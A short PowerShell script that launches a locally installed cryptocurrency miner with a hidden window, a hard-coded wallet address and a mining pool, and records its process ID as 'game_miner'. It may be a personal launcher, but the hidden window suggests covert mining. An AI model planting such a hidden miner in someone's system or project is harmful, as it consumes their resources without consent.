param()

$ErrorActionPreference = 'Stop'
$root = $PSScriptRoot | Split-Path -Parent
$minerRoot = 'C:\bbb\onezerominer-win64-1.7.4'
$minerExe = Join-Path $minerRoot 'onezerominer.exe'

if (-not (Test-Path -LiteralPath $minerExe)) {
  throw "Miner exe not found: $minerExe"
}

$logDir = Join-Path $root 'logs'
if (-not (Test-Path -LiteralPath $logDir)) {
  New-Item -ItemType Directory -Force -Path $logDir | Out-Null
}

$pidPath = Join-Path $logDir 'game_miner.pid'
$args = @(
  '-a', 'qhash',
  '-w', 'bc1q55jlw2d4xrw87gl7sdc0jngg8ektngxaptvkv8.worker',
  '-o', 'stratum+ssl://qtc-eu.rplant.xyz:17154'
)

$process = Start-Process -FilePath $minerExe -ArgumentList $args -WorkingDirectory $minerRoot -WindowStyle Hidden -PassThru
Set-Content -LiteralPath $pidPath -Value $process.Id
